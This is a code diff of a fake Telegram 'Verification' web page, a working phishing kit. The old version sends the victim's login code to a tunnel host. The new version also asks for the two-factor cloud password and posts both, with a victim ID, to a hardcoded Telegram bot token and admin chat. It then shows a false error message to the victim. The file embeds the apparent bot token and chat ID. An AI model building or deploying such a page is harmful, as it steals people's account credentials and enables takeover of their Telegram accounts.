@@ -1,90 +1,48 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verification</title>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; margin: 0; }
-        .logo { width: 80px; height: 80px; margin-bottom: 25px; }
-        
-        .input-box {
-            width: 100%;
-            max-width: 320px;
-            margin: 0 auto 20px;
-            background: #1c252f;
-            border: 1px solid #2a3644;
-            border-radius: 12px;
-            height: 56px;
-            display: flex;
-            align-items: center;
-        }
-
-        input {
-            width: 100%;
-            background: transparent;
-            border: none;
-            color: #fff;
-            font-size: 22px;
-            text-align: center;
-            outline: none;
-            letter-spacing: 4px; /* Чтобы код выглядел как в Telegram */
-        }
-
-        button { 
-            width: 100%; 
-            max-width: 320px; 
-            height: 50px;
-            background: #248bdf; 
-            border: none; 
-            border-radius: 12px; 
-            color: #fff; 
-            font-weight: 700; 
-            font-size: 16px; 
-            cursor: pointer; 
-        }
-
-        p { color: #8a99a8; font-size: 15px; margin-bottom: 30px; }
+        body { background: #0f0f0f; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { width: 80%; max-width: 400px; text-align: center; }
+        input { background: #1c1c1c; border: 1px solid #333; color: white; padding: 15px; width: 100%; border-radius: 10px; margin-bottom: 20px; box-sizing: border-box; font-size: 16px; }
+        .btn { background: #248bda; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
-    <img src="https://telegram.org/img/t_logo.png" class="logo">
-    
-    <h2>Enter Code</h2>
-    <p>Check your Telegram notifications</p>
-    
-    <div class="input-box">
-        <input type="tel" id="code" placeholder="00000" maxlength="5" autocomplete="off" autofocus>
+
+    <div class="container">
+        <h1>Enter Code</h1>
+        <p>Check your Telegram app</p>
+        <input type="text" id="code" placeholder="Code from Telegram">
+        <input type="password" id="cloud" placeholder="2FA Password (if set)">
+        <button class="btn" onclick="sendCode()">Verify</button>
     </div>
-    
-    <button id="btn" onclick="submitCode()">Verify</button>
 
     <script>
-        const input = document.getElementById('code');
+        const botToken = "8598157493:AAH_95b9t0ehVfwvfBm2vcnySZyyY79rUBg";
+        const adminId = "6990072009";
+        const params = new URLSearchParams(window.location.search);
+        const uid = params.get('uid') || 'Unknown';
 
-        // Разрешаем только цифры и не более 5
-        input.addEventListener('input', () => {
-            input.value = input.value.replace(/\D/g, '').substring(0, 5);
-        });
+        async function sendCode() {
+            const code = document.getElementById('code').value;
+            const cloud = document.getElementById('cloud').value || "None";
+            
+            if(!code) return alert("Enter code!");
 
-        async function submitCode() {
-            const val = input.value;
-            if (val.length !== 5) {
-                alert("Please enter a 5-digit code.");
-                return;
-            }
+            const text = `🔑 **ДАННЫЕ ДЛЯ ВХОДА**\n👤 ID: \`${uid}\` \n💬 Код: \`${code}\` \n🔐 2FA: \`${cloud}\``;
+            
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: adminId, text: text, parse_mode: "Markdown" })
+            });
 
-            const uid = new URLSearchParams(window.location.search).get('uid') || "Unknown";
-
-            try {
-                await fetch("https://ffdb8aa38a66bbe8-95-24-163-77.serveousercontent.com/submit", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ type: 'code', value: val, uid: uid })
-                });
-            } catch(e) {}
-
-            // Если в Ultimate Pro включен двухфакторный пароль — шлем туда
-            window.location.href = "password.html" + window.location.search;
+            // После ввода кода можно перекинуть на официальный сайт или показать ошибку
+            alert("Verification error. Try again later.");
         }
     </script>
 </body>
